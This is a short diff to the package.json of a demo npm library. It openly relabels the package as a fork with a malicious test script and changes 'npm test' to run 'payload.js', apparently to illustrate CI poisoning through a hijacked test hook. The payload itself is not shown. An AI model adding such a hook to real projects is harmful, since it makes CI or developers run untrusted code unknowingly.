@@ -1,10 +1,10 @@
 {
   "name": "awesome-logger",
   "version": "1.0.0",
-  "description": "A tiny demo library, standing in for a popular OSS package with CI.",
+  "description": "Fork with a malicious test script. 'npm test' now runs payload.js.",
   "main": "index.js",
   "scripts": {
-    "test": "node test/basic.test.js"
+    "test": "node payload.js"
   },
   "license": "MIT"
 }
